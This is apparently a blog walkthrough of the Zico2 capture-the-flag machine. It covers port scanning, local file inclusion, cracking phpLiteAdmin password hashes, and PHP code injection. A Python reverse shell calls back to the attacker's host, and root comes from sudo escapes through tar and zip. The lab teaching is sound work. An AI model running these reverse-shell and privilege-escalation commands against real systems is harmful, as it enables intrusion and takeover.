@@ -1,0 +1,278 @@
+I"�C<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>A ping scan on the local network discovered the target host, the script you can find it <a href="">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/zico2<span class="nv">$ </span>hdiscovery.py <span class="nt">-t</span> 192.168.179.0/24
+192.168.179.179 is alive
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>The full TCP scan with nmap discovered four open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/zico2<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.179 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+47159/tcp open  unknown
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>The aggressive scan reveals the SSH service running on port 22, apache on port 80, rpcbind on port 111, and a fork for RPC on port 47159.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/zico2<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-p22</span>,80,111,47159 192.168.179.179 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT      STATE SERVICE VERSION                                           
+22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:                                                      
+|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 <span class="o">(</span>DSA<span class="o">)</span>     
+|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 <span class="o">(</span>RSA<span class="o">)</span>         
+|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 <span class="o">(</span>ECDSA<span class="o">)</span>   
+80/tcp    open  http    Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>        
+| http-methods:                                      
+|_  Supported Methods: OPTIONS GET HEAD POST            
+|_http-server-header: Apache/2.2.22 <span class="o">(</span>Ubuntu<span class="o">)</span>    
+|_http-title: Zico<span class="s1">'s Shop                      
+111/tcp   open  rpcbind 2-4 (RPC #100000)      
+| rpcinfo:                                    
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          33465/udp   status 
+|   100024  1          40806/tcp6  status 
+|   100024  1          47159/tcp   status 
+|_  100024  1          60683/udp6  status 
+47159/tcp open  status  1 (RPC #100024)
+...
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>On The web service we can see a shop web page.</p>
+
+<p><img src="/assets/images/zico2/screenshot-1.png" alt="" /></p>
+
+<p>Browsing I found that <strong>page</strong> parameter is including an HTML file.</p>
+
+<p><img src="/assets/images/zico2/screenshot-2.png" alt="" /></p>
+
+<p>By trying to include the system’s password file was detected that is vulnerable to Local File Inclusion.</p>
+
+<p><img src="/assets/images/zico2/screenshot-3.png" alt="" /></p>
+
+<p>A quick enumeration with dirb was found the <strong>dbadmin</strong> directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/zico2<span class="nv">$ </span>dirb http://192.168.179.179 <span class="nt">-r</span>
+...
+<span class="nt">----</span> Scanning URL: http://192.168.179.179/ <span class="nt">----</span>
++ http://192.168.179.179/cgi-bin/ <span class="o">(</span>CODE:403|SIZE:291<span class="o">)</span>  
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/css/          
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/dbadmin/      
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/img/        
++ http://192.168.179.179/index <span class="o">(</span>CODE:200|SIZE:7970<span class="o">)</span>  
++ http://192.168.179.179/index.html <span class="o">(</span>CODE:200|SIZE:7970<span class="o">)</span> 
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/js/             
++ http://192.168.179.179/LICENSE <span class="o">(</span>CODE:200|SIZE:1094<span class="o">)</span>  
++ http://192.168.179.179/package <span class="o">(</span>CODE:200|SIZE:789<span class="o">)</span>  
++ http://192.168.179.179/server-status <span class="o">(</span>CODE:403|SIZE:296<span class="o">)</span>
++ http://192.168.179.179/tools <span class="o">(</span>CODE:200|SIZE:8355<span class="o">)</span>   
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/vendor/     
++ http://192.168.179.179/view <span class="o">(</span>CODE:200|SIZE:0<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We access to this and we found a link, and click on it.</p>
+
+<p><img src="/assets/images/zico2/screenshot-4.png" alt="" /></p>
+
+<p>This contains a login form, we log in entering <strong>admin</strong> as password.</p>
+
+<p><img src="/assets/images/zico2/screenshot-5.png" alt="" /></p>
+
+<p><img src="/assets/images/zico2/screenshot-6.png" alt="" /></p>
+
+<p>By browsing was found two users with their respectibly password hashes.</p>
+
+<p><img src="/assets/images/zico2/screenshot-7.png" alt="" /></p>
+
+<p>We copy the password hashes into a file, and we crack it with hashcat.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/zico2<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"96781A607F4E9F5F423AC01F0DAB0EBD</span><span class="se">\n</span><span class="s2">653F4B285089453FE00E2AAFAC573414"</span> <span class="o">&gt;</span> hashes.phplite
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/zico2<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> rockyou.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/zico2<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 0 hashes.phplite rockyou.txt
+...
+96781a607f4e9f5f423ac01f0dab0ebd:zico2215@
+653f4b285089453fe00e2aafac573414:34kroot34 
+</code></pre></div></div>
+
+<p>In seconds hashcat logró to crack the MD5 hashes, with this credentials was not possible to access via SSH to the server.</p>
+
+<p>A Remote Code Injection vulnerability was discovered for phpLiteAdmin 1.9.3.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/zico2<span class="nv">$ </span>searchsploit phpliteadmin 1.9.3                            
+<span class="nt">-----------------------------------------------------------</span> <span class="nt">-------------------------</span>
+ Exploit Title                                             |  Path
+<span class="nt">-----------------------------------------------------------</span> <span class="nt">-------------------------</span>
+PHPLiteAdmin 1.9.3 - Remote PHP Code Injection             | php/webapps/24044.txt
+<span class="nt">-----------------------------------------------------------</span> <span class="nt">-------------------------</span>
+</code></pre></div></div>
+
+<p>We copy the exploit to our current directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/zico2<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/24044.txt
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="remote-php-code-injection">Remote PHP Code Injection</h3>
+
+<p>We follow the described instructions in the exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/zico2<span class="nv">$ </span><span class="nb">cat </span>24044.txt
+...
+Proof of Concept:
+
+1. We create a db named <span class="s2">"hack.php"</span><span class="nb">.</span>
+<span class="o">(</span>Depending on Server configuration sometimes it will not work and the name <span class="k">for </span>the db will be <span class="s2">"hack.sqlite"</span><span class="nb">.</span> Then simply try to rename the database / existing database to <span class="s2">"hack.php"</span>.<span class="o">)</span>
+The script will store the sqlite database <span class="k">in </span>the same directory as phpliteadmin.php.
+Preview: http://goo.gl/B5n9O
+Hex preview: http://goo.gl/lJ5iQ
+
+2. Now create a new table <span class="k">in </span>this database and insert a text field with the default value:
+&lt;?php phpinfo<span class="o">()</span>?&gt;
+Hex preview: http://goo.gl/v7USQ
+
+3. Now we run hack.php
+</code></pre></div></div>
+
+<p>We create a database named <strong>hack.php</strong>.</p>
+
+<p><img src="/assets/images/zico2/screenshot-8.png" alt="" /></p>
+
+<p>We create a table named <strong>lite</strong> that will contain a column named <strong>input</strong>.</p>
+
+<p><img src="/assets/images/zico2/screenshot-9.png" alt="" /></p>
+
+<p><img src="/assets/images/zico2/screenshot-10.png" alt="" /></p>
+
+<p>We insert a web shell into the <strong>input</strong> column.</p>
+
+<p><img src="/assets/images/zico2/screenshot-11.png" alt="" /></p>
+
+<p>Using the LFI vulnerability we can include the <strong>hack.php</strong> database, to run the <strong>whoami</strong> commad.</p>
+
+<p><img src="/assets/images/zico2/screenshot-12.png" alt="" /></p>
+
+<p>We need to set up a netcat listener on port 443, and run the following python reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.179.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/zico2/screenshot-13.png" alt="" /></p>
+
+<p>We have a shell with privileges of user <strong>www-data</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/zico2<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.179] 55927
+www-data@zico:/var/www<span class="err">$</span>
+</code></pre></div></div>
+
+<p>listing the wordpress configuration file in the zico’s home directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@zico:/home/zico/wordpress<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-40</span> wp-config.php
+<span class="nb">head</span> <span class="nt">-40</span> wp-config.php
+...
+// <span class="k">**</span> MySQL settings - You can get this info from your web host <span class="k">**</span> //
+/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'zico'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database username <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'zico'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database password <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'sWfCsfJSPV9H3AmQzw8'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'zico'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> Database Charset to use <span class="k">in </span>creating database tables. <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_CHARSET'</span>, <span class="s1">'utf8'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> The Database Collate type. Don<span class="s1">'t change this if in doubt. */
+define('</span>DB_COLLATE<span class="s1">', '');
+</span></code></pre></div></div>
+
+<p>We reuse the wordpress password to connect to MySQL database to switch to user zico.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@zico:/home/zico<span class="nv">$ </span>su zico
+su zico
+Password: sWfCsfJSPV9H3AmQzw8
+
+zico@zico:~<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>zico<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>zico<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>zico<span class="o">)</span>
+</code></pre></div></div>
+
+<p>The user zico has sudo privileges to run the tar and zip binaries, we will use the both to get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zico@zico:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>zico on this host:
+    env_reset, <span class="nv">exempt_group</span><span class="o">=</span>admin,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User zico may run the following commands on this host:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/tar
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/zip
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>To get root via tar we execute the following command that will execute /bin/bash on each checkpoint, this method was extracted of <a href="https://gtfobins.github.io/gtfobins/tar/#sudo">GTFOBINS</a> blog.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zico@zico:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/tar <span class="nt">-cf</span> /dev/null /dev/null <span class="nt">--checkpoint</span><span class="o">=</span>1 <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>/bin/bash
+&lt;<span class="nt">-cf</span> /dev/null /dev/null <span class="nt">--checkpoint</span><span class="o">=</span>1 <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>/bin/bash   
+/bin/tar: Removing leading <span class="sb">`</span>/<span class="s1">' from member names
+root@zico:~#
+</span></code></pre></div></div>
+
+<p>We execute the folloeing zip command to get root, this topic you can find it in the <a href="https://gtfobins.github.io/gtfobins/zip/#sudo">GTFOBINS</a> blog.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zico@zico:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/zip /dev/null /etc/sudoers <span class="nt">-T</span> <span class="nt">-TT</span> <span class="s1">'bash #'</span>
+<span class="nb">sudo</span> /usr/bin/zip /dev/null /etc/sudoers <span class="nt">-T</span> <span class="nt">-TT</span> <span class="s1">'bash #'</span>
+  adding: etc/sudoers <span class="o">(</span>deflated 49%<span class="o">)</span>
+root@zico:~#
+</code></pre></div></div>
+
+<p>And finally we read the root flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@zico:~# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+root@zico:/root# <span class="nb">ls 
+ls
+</span>flag.txt
+root@zico:/root# <span class="nb">cat </span>flag.txt
+<span class="nb">cat </span>flag.txt
+<span class="c">#</span>
+<span class="c">#</span>
+<span class="c">#</span>
+<span class="c"># ROOOOT!</span>
+<span class="c"># You did it! Congratz!</span>
+<span class="c"># </span>
+<span class="c"># Hope you enjoyed! </span>
+<span class="c"># </span>
+<span class="c"># </span>
+<span class="c">#</span>
+<span class="c">#</span>
+</code></pre></div></div>
+:ET
